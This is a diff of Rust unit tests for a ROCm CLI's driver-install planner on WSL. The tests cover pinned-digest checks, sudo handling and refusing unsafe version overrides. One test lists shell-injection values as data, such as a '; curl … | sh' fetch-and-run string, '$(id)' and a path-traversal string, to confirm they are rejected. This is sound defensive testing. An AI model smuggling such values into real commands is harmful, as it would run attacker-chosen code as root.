+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        write_driver_install_state(&paths, &state)?;
+        let mut observed = Vec::new();
+        let mut gathered = false;
+
+        let error = execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                if command == "verify" {
+                    bail!("verification rejected the install");
+                }
+                Ok(())
+            },
+            |state| write_driver_install_state(&paths, state),
+            || {
+                gathered = true;
+                Ok(test_examine("linux", true).driver)
+            },
+        )
+        .expect_err("failed verification must fail the install");
+        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");
+
+        assert_eq!(observed, ["prepare", "execute", "verify"]);
+        assert!(error.to_string().contains("driver command failed: verify"));
+        assert!(
+            !gathered,
+            "post-install state must not be gathered after failure"
+        );
+        assert_eq!(state.executed_at_unix_ms, None);
+        assert!(state.post_driver.is_none());
+        assert_eq!(saved.executed_at_unix_ms, None);
+        assert!(saved.post_driver.is_none());
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn failed_post_driver_gather_keeps_executed_state_persisted() -> Result<()> {
+        let (root, paths) = test_paths("driver-gather-failure-state");
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        write_driver_install_state(&paths, &state)?;
+
+        let error = execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |_| Ok(()),
+            |state| write_driver_install_state(&paths, state),
+            || bail!("post-driver gather failed"),
+        )
+        .expect_err("a post-driver gather failure must still fail the install");
+        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");
+
+        assert!(error.to_string().contains("post-driver gather failed"));
+        assert!(saved.executed_at_unix_ms.is_some());
+        assert!(saved.post_driver.is_none());
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
     fn driver_reconcile_without_state_gives_non_privileged_guidance() -> Result<()> {
         let (root, paths) = test_paths("driver-reconcile-empty");
 
@@ -30103,6 +30733,48 @@ VERSION_CODENAME=noble
         assert_eq!(reconciliation.check_summary.present, 1);
         assert_eq!(reconciliation.check_summary.missing, 1);
         let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn driver_reconcile_preserves_explicit_reboot_policy() -> Result<()> {
+        for reboot_required in [false, true] {
+            let (root, paths) = test_paths(if reboot_required {
+                "driver-reconcile-reboot-true"
+            } else {
+                "driver-reconcile-reboot-false"
+            });
+            let driver = rocm_core::DriverSummary {
+                policy: "driver-policy".to_owned(),
+                status: "available".to_owned(),
+                detail: None,
+            };
+            let mut state = DriverInstallState {
+                approved_at_unix_ms: 1,
+                executed_at_unix_ms: Some(2),
+                pre_driver: driver.clone(),
+                post_driver: None,
+                boot_id_at_execution: Some("same-boot".to_owned()),
+                reboot_required,
+                reboot_observed: false,
+                commands: vec!["execute".to_owned()],
+                reconciled_at_unix_ms: None,
+                reconciliation: None,
+            };
+
+            reconcile_driver_install_state(
+                &paths,
+                &mut state,
+                driver,
+                Some("same-boot".to_owned()),
+                Vec::new(),
+            )?;
+            let saved = read_driver_install_state(&paths)?.expect("state should be saved");
+
+            assert_eq!(state.reboot_required, reboot_required);
+            assert_eq!(saved.reboot_required, reboot_required);
+            let _ = fs::remove_dir_all(root);
+        }
         Ok(())
     }
 
@@ -30480,8 +31152,17 @@ VERSION_ID="41"
     }
 
     #[test]
-    fn wsl_install_driver_uses_rocdxg_guidance_without_dkms() {
-        let _env = ScopedTestEnv::with_amd_overrides_cleared();
+    fn wsl_install_driver_installs_rocdxg_without_dkms() {
+        // `dkms: true` is passed deliberately: WSL2 has no kernel module to
+        // build, so the flag must not pull in the bare-metal path.
+        //
+        // `build_driver_install_plan` resolves `${ROCM_CLI_AMDGPU_VERSION:-...}`
+        // from process env before it reaches the WSL branch, and the WSL branch
+        // then reads the three ROCDXG vars — an exported
+        // `ROCM_CLI_ROCDXG_VERSION` would steer this plan into a refusal and
+        // fail the `plan.supported` assertion below. So this reader takes the
+        // guard that clears both sets.
+        let _env = scoped_rocdxg_env();
         let plan = build_driver_install_plan(
             &test_examine("linux", true),
             "",
@@ -30490,12 +31171,500 @@ VERSION_ID="41"
         );
         let rendered = render_driver_install_plan(&plan, false, false);
 
-        assert!(!plan.supported);
+        assert!(plan.supported);
+        assert!(plan.mutating);
         assert_eq!(plan.policy, "wsl_rocdxg");
-        assert!(rendered.contains("approval: not required"));
-        assert!(rendered.contains("execution_commands: <none>"));
-        assert!(rendered.contains("scripts/wsl_setup_rocdxg.sh"));
         assert!(!rendered.contains("amdgpu-dkms"));
+        // The whole point of the bug: the plan must be runnable, and must not
+        // send the user to a file that only exists in a git checkout.
+        assert!(!rendered.contains("execution_commands: <none>"));
+        assert!(!rendered.contains("scripts/"));
+        assert!(rendered.contains("approval: required"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_installs_the_library_and_publishes_it() {
+        // Asserts on the default plan, so it has to take the same guard as the
+        // mutating tests in this binary: a concurrent test exporting
+        // `ROCM_CLI_ROCDXG_VERSION` would otherwise steer this one's plan.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let commands = plan.execution_commands().join("\n");
+
+        // Fetches the release artifact, installs it, and makes the linker see
+        // it. Any one of these missing leaves `wsl_rocdxg_ready` unreachable.
+        assert!(commands.contains("https://github.com/ROCm/librocdxg/releases/download/"));
+        assert!(commands.contains("rocdxg-roct_"));
+        assert!(commands.contains("sudo apt-get install -y '/tmp/rocdxg-roct_"));
+        assert!(commands.contains("sudo ldconfig"));
+
+        // And in that order. `ldconfig` refreshes the cache from what is on
+        // disk now, so running it before `apt-get install` has unpacked
+        // `librocdxg.so` scans a directory that does not contain it yet and
+        // publishes nothing — leaving the plan reporting success while the
+        // `ldconfig -p` verification below is the only thing that would notice.
+        // Both steps are still present under that swap, so every `contains`
+        // assertion in this file stays green; only a position comparison
+        // catches it.
+        let steps = plan.execution_commands();
+        let install = steps
+            .iter()
+            .position(|c| c.contains("apt-get install -y '/tmp/"))
+            .expect("plan installs the package");
+        let publish = steps
+            .iter()
+            .position(|c| c.trim_end().ends_with("ldconfig"))
+            .expect("plan publishes the library");
+        assert!(
+            install < publish,
+            "ldconfig must run after the package is installed:\n{}",
+            steps.join("\n")
+        );
+
+        // Verification asserts the two things `examine` keys `wsl_rocdxg_ready`
+        // on, so a silently partial install cannot report success.
+        let verify = plan
+            .commands
+            .iter()
+            .filter(|c| c.phase == DriverCommandPhase::Verify)
+            .map(|c| c.command.clone())
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert!(verify.contains("/opt/rocm/lib/librocdxg.so"));
+        assert!(verify.contains("ldconfig -p"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_guards_the_gpu_plumbing_before_any_mutating_command() {
+        // /dev/dxg and dxcore come from the Windows side. If they are missing,
+        // installing the bridge library accomplishes nothing, so the plan must
+        // stop rather than report a successful install of something inert.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let prepare = plan
+            .commands
+            .iter()
+            .filter(|c| c.phase == DriverCommandPhase::Prepare)
+            .map(|c| c.command.clone())
+            .collect::<Vec<_>>();
+        let joined = prepare.join("\n");
+        assert!(joined.contains("/dev/dxg"));
+        assert!(joined.contains("/usr/lib/wsl/lib/libdxcore.so"));
+        // Named explicitly, rather than surfacing as `sudo: command not found`
+        // from whichever privileged step happened to run first.
+        assert!(joined.contains("command -v sudo"));
+        // Both guards run before anything is fetched or installed.
+        let first_mutation = plan
+            .execution_commands()
+            .iter()
+            .position(|c| c.contains("apt-get") || c.contains("curl"))
+            .expect("plan installs something");
+        let last_guard = plan
+            .execution_commands()
+            .iter()
+            .rposition(|c| c.contains("is missing"))
+            .expect("plan guards the plumbing");
+        assert!(
+            last_guard < first_mutation,
+            "plumbing guards must precede the first mutating command"
+        );
+    }
+
+    /// Clear every input that steers the ROCDXG plan, so a value exported in
+    /// the developer's or runner's shell cannot decide the outcome of a test
+    /// that is asserting on the default.
+    ///
+    /// Builds on [`ScopedTestEnv::with_amd_overrides_cleared`] rather than
+    /// `new` because a WSL plan reached through `build_driver_install_plan`
+    /// resolves the bare-metal AMDGPU overrides before it dispatches to the WSL
+    /// branch: a caller needing one of these two guards needs both, and one
+    /// helper spares every test from picking the wrong half.
+    fn scoped_rocdxg_env() -> ScopedTestEnv {
+        let mut env = ScopedTestEnv::with_amd_overrides_cleared();
+        env.clear("ROCM_CLI_ROCDXG_VERSION");
+        env.clear(ROCDXG_SHA256_ENV);
+        env.clear(ROCDXG_ALLOW_UNVERIFIED_ENV);
+        env
+    }
+
+    #[test]
+    fn wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default() {
+        // The package is installed with `apt-get install`, which runs its
+        // maintainer scripts as root. With no digest, TLS to the release host
+        // is the only thing authenticating that download — weaker than the
+        // bare-metal path in this same file, which installs from a
+        // `signed-by=` pinned repository. So the default plan must verify.
+        let _env = scoped_rocdxg_env();
+        let commands = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo).execution_commands();
+        let joined = commands.join("\n");
+
+        let pinned = ROCDXG_PINNED_DIGESTS
+            .iter()
+            .find_map(|(version, digest)| (*version == "1.2.2").then_some(*digest))
+            .expect("the default version is pinned");
+        assert!(joined.contains(pinned), "{joined}");
+        assert!(joined.contains("sha256sum -c -"), "{joined}");
+
+        // Not a conditional: an unset variable must not be able to turn
+        // verification off, which is what the previous `if [ -n ... ]` form
+        // did.
+        assert!(
+            !joined.contains("skipping checksum verification"),
+            "{joined}"
+        );
+        assert!(!joined.contains(ROCDXG_SHA256_ENV), "{joined}");
+
+        // Ordering is the whole point — a digest checked after the install has
+        // already run is decoration.
+        let check = commands
+            .iter()
+            .position(|c| c.contains("sha256sum -c -"))
+            .expect("plan verifies the download");
+        let install = commands
+            .iter()
+            .position(|c| c.contains("apt-get install -y '/tmp/"))
+            .expect("plan installs the package");
+        assert!(check < install, "digest must be checked before install");
+    }
+
+    #[test]
+    fn wsl_rocdxg_refuses_a_version_whose_digest_is_unknown() {
+        // An unpinned version is the case where silently falling back to "no
+        // verification" would be most dangerous, because it is reachable from
+        // a single environment variable.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!plan.supported);
+        assert!(!plan.mutating);
+        assert!(plan.commands.is_empty(), "a refusal must run nothing");
+        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
+        assert!(
+            plan.reason.contains(ROCDXG_ALLOW_UNVERIFIED_ENV),
+            "{}",
+            plan.reason
+        );
+    }
+
+    #[test]
+    fn wsl_rocdxg_accepts_a_supplied_digest_for_an_unpinned_version() {
+        // The escape hatch for a release newer than this build: supply the
+        // digest rather than disabling verification.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        let supplied = "a".repeat(64);
+        env.set(ROCDXG_SHA256_ENV, &supplied);
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(plan.supported);
+        let joined = plan.execution_commands().join("\n");
+        assert!(joined.contains(&supplied), "{joined}");
+        assert!(joined.contains("sha256sum -c -"), "{joined}");
+    }
+
+    #[test]
+    fn wsl_rocdxg_rejects_a_malformed_supplied_digest() {
+        // A truncated or mistyped digest must not silently fall back to the
+        // pinned one, which would verify a different artifact than the user
+        // asked for and report success.
+        let mut env = scoped_rocdxg_env();
+        env.set(ROCDXG_SHA256_ENV, "not-a-digest");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!plan.supported);
+        assert!(plan.commands.is_empty());
+        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
+    }
+
+    #[test]
+    fn wsl_rocdxg_unverified_install_takes_an_explicit_opt_out() {
+        // Installing unverified stays possible — it just has to be asked for,
+        // and the plan the user approves has to say so.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(plan.supported);
+        let joined = plan.execution_commands().join("\n");
+        assert!(!joined.contains("sha256sum -c -"), "{joined}");
+        assert!(joined.contains("without verifying it"), "{joined}");
+    }
+
+    #[test]
+    fn wsl_rocdxg_opt_out_reads_negative_values_as_off() {
+        // The opt-out is a boolean, not a presence check. Reading "set to
+        // anything" as yes would turn digest verification off for a package
+        // installed as root on the strength of `=0` — the one value a reader
+        // writes when they mean the opposite.
+        for negative in ["0", "false", "no", "off", ""] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, negative);
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(
+                !plan.supported,
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} disabled verification"
+            );
+            assert!(
+                plan.commands.is_empty(),
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} built an unverified install"
+            );
+        }
+
+        // The affirmative spellings still work, so this is a narrowing of what
+        // counts as yes rather than a removal of the escape hatch.
+        for affirmative in ["1", "true", "yes", "on"] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, affirmative);
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(
+                plan.supported,
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={affirmative:?} was not honoured"
+            );
+        }
+    }
+
+    #[test]
+    fn wsl_rocdxg_refuses_a_version_that_could_escape_the_shell() {
+        // `ROCM_CLI_ROCDXG_VERSION` is interpolated into commands executed via
+        // `sh -c` after `apt-get update` has primed the sudo credential cache,
+        // so a `;` in it would start a second, attacker-chosen command running
+        // as root. The plan must refuse rather than quote its way out.
+        for hostile in [
+            "1.2.0; curl http://example.invalid/x | sh",
+            "1.2.0 && id",
+            "$(id)",
+            "1.2.0`id`",
+            "../../etc/passwd",
+            "1.2.0\nid",
+            "1.2.0 ",
+        ] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", hostile);
+            // An opt-out must not buy past the version check either.
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(!plan.supported, "accepted hostile version {hostile:?}");
+            assert!(
+                plan.commands.is_empty(),
+                "built commands from hostile version {hostile:?}"
+            );
+            // The refused value is echoed back in the plan a human reads, so it
+            // must not be able to forge lines there. Every line the renderer
+            // emits after the header is indented, so an unindented one came
+            // from the value.
+            let rendered = render_driver_install_plan(&plan, false, false);
+            for line in rendered.lines().skip(1) {
+                assert!(
+                    line.starts_with("  "),
+                    "hostile version {hostile:?} forged plan line {line:?} in:\n{rendered}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_drops_sudo_when_already_root() {
+        // Same reason the bare-metal plans take an escalation: containers and
+        // minimal cloud images run as uid 0 with no `sudo` binary, where an
+        // unconditional prefix kills every command before any driver work.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::AlreadyRoot);
+        let joined = plan.execution_commands().join("\n");
+        assert!(!joined.contains("sudo "), "{joined}");
+        assert!(joined.contains("apt-get install -y '/tmp/"), "{joined}");
+        // And it must not demand a binary it no longer uses.
+        assert!(!joined.contains("command -v sudo"), "{joined}");
+        assert!(
+            !plan
+                .preflight_checks
+                .iter()
+                .any(|check| check.contains("`sudo` command is available")),
+            "{:?}",
+            plan.preflight_checks
+        );
+    }
+
+    /// Runs the digest step the plan actually generates, rather than asserting
+    /// that it contains some substrings.
+    ///
+    /// The step this exercises is the trust anchor for a root install, and the
+    /// executable self-test that used to cover it was deleted along with
+    /// `scripts/wsl_setup_rocdxg.sh`. Substring assertions would let a quoting,
+    /// field-order or newline regression in the `printf | sha256sum -c -`
+    /// fragment ship green, so the generated command is pinned whole with
+    /// `assert_eq!` and then executed — with only the two values it embeds
+    /// redirected at a test payload, so the quoting, spacing and field order
+    /// under test are production's rather than a replica's.
+    ///
+    /// Field order in particular is invisible to a `starts_with`/`ends_with`
+    /// pair: `sha256sum -c -` reads `DIGEST  FILENAME`, so emitting the path
+    /// first breaks every real WSL install while still starting with
+    /// `printf '%s  %s\n' '` and ending with `' | sha256sum -c -`.
+    #[cfg(unix)]
+    #[test]
+    fn wsl_rocdxg_generated_digest_step_accepts_only_the_matching_file() {
+        use std::process::Command;
+
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let version = plan.repo_version.clone();
+        let pinned = ROCDXG_PINNED_DIGESTS
+            .iter()
+            .find_map(|(pinned_version, digest)| {
+                (*pinned_version == version.as_str()).then_some(*digest)
+            })
+            .expect("the default version is pinned");
+        let deb_path = format!("/tmp/rocdxg-roct_{version}_amd64.deb");
+        let generated = plan
+            .execution_commands()
+            .into_iter()
+            .find(|c| c.contains("sha256sum -c -"))
+            .expect("plan verifies the download");
+
+        // Whole-string, not `contains`: the digest has to come first and the
+        // two fields have to be separated by exactly the two spaces
+        // `sha256sum -c -` expects.
+        assert_eq!(
+            generated,
+            format!("printf '%s  %s\\n' '{pinned}' '{deb_path}' | sha256sum -c -")
+        );
+
+        let (root, _paths) = test_paths("wsl-rocdxg-digest");
+        fs::create_dir_all(&root).expect("test root");
+        let payload = root.join(format!("rocdxg-roct_{version}_amd64.deb"));
+        fs::write(&payload, b"pretend this is a .deb\n").expect("write payload");
+
+        let digest_of = |path: &Path| -> String {
+            let out = Command::new("sha256sum")
+                .arg(path)
+                .output()
+                .expect("sha256sum runs");
+            assert!(out.status.success());
+            String::from_utf8(out.stdout)
+                .expect("utf8")
+                .split_whitespace()
+                .next()
+                .expect("digest field")
+                .to_owned()
+        };
+        let good = digest_of(&payload);
+
+        // The command under test is the generated one; the only edits are the
+        // digest being checked and the path being checked, so a regression in
+        // how the fragment is built reaches `sh` here instead of being masked
+        // by a replica built to the test's own idea of the right shape.
+        let step = |digest: &str| -> bool {
+            let command = generated
+                .replace(pinned, digest)
+                .replace(&deb_path, &payload.display().to_string());
+            Command::new("sh")
+                .arg("-c")
+                .arg(&command)
+                .output()
+                .expect("sh runs")
+                .status
+                .success()
+        };
+
+        assert!(step(&good), "the matching digest must pass");
+        assert!(
+            !step(&"0".repeat(64)),
+            "a mismatched digest must fail the step"
+        );
+        assert!(!step("deadbeef"), "a malformed digest must fail the step");
+        assert!(!step(""), "an empty digest must fail the step");
+
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn wsl_rocdxg_install_does_not_ask_for_a_reboot() {
+        // ROCDXG is userspace: `ldconfig` publishes it in this boot. The
+        // bare-metal DKMS path is the one that needs a reboot.
+        let _env = scoped_rocdxg_env();
+        let wsl = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!wsl.reboot_required);
+        let rendered = render_driver_install_plan(&wsl, false, false);
+        // Anchor on the install step first: a refusal plan also reports
+        // `reboot_required: false`, renders `post_install_checks:` from its
+        // non-empty `checks`, and contains no `post_reboot` — so the three
+        // assertions below hold against a plan that installs nothing at all.
+        // Only a real install plan carries this command.
+        assert!(
+            rendered.contains("apt-get install -y '/tmp/"),
+            "expected a real install plan, got:\n{rendered}"
+        );
+        assert!(rendered.contains("post_install_checks:"));
+        assert!(!rendered.contains("post_reboot"));
+
+        let bare_metal = build_driver_install_plan(
+            &test_examine("linux", false),
+            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(bare_metal.reboot_required);
+        assert!(render_driver_install_plan(&bare_metal, false, false).contains("post_reboot"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_version_is_overridable_and_reaches_every_reference() {
+        // One resolved value drives the archive name, the release tag and the
+        // download path, so an override cannot leave a URL pointing at the
+        // default. The value is resolved at plan-build time rather than left as
+        // a `${VAR:-default}` template, so the plan the user reviews names the
+        // build the install will actually fetch.
+        let mut env = scoped_rocdxg_env();
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert_eq!(plan.repo_version, "1.2.2");
+        let commands = plan.execution_commands().join("\n");
+        // The version is resolved here, not deferred to the shell: the plan the
+        // user approves has to name the build the install will actually fetch.
+        // No `${...}` expansion survives into the commands at all — the digest
+        // is resolved at plan-build time too, which
+        // `wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default`
+        // asserts by name.
+        assert!(
+            !commands.contains("ROCM_CLI_ROCDXG_VERSION"),
+            "version must be resolved at plan-build time, not left as a shell template:\n{commands}"
+        );
+        let occurrences = commands.matches("1.2.2").count();
+        assert!(
+            occurrences >= 3,
+            "version should drive the deb name, the tag and the path; saw {occurrences}"
+        );
+
+        // An override has to reach every one of those references, including the
+        // release URL — the bug this guards is a URL left on the default. The
+        // digest comes along because an unpinned version is refused outright;
+        // see `wsl_rocdxg_refuses_a_version_whose_digest_is_unknown`.
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        env.set(ROCDXG_SHA256_ENV, &"b".repeat(64));
+        let overridden = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert_eq!(overridden.repo_version, "9.9.9");
+        let commands = overridden.execution_commands().join("\n");
+        assert!(
+            commands.contains("rocdxg-roct_9.9.9_amd64.deb"),
+            "{commands}"
+        );
+        assert!(
+            commands.contains(
+                "https://github.com/ROCm/librocdxg/releases/download/v9.9.9/rocdxg-roct_9.9.9_amd64.deb"
+            ),
+            "{commands}"
+        );
+        assert!(
+            !commands.contains("1.2.2"),
+            "override left a reference on the default version:\n{commands}"
+        );
     }
 
     // EAI-7406: distro selection must honor `/etc/os-release` `ID_LIKE`, so that
